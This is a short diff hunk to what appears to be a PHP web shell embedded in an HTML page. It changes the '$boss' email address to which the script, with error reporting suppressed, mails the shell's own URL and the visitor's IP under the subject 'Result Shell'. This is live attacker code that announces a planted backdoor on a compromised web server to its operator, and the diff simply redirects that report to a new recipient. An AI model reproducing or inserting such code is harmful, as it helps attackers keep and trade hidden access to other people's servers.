@@ -24,7 +24,7 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 <?php
 set_time_limit(0);
 error_reporting(0);
-$boss = 'mrtundelawal@yahoo.com';
+$boss = 'codezsec@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ip = "Shell : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
 mail($boss, "Result Shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
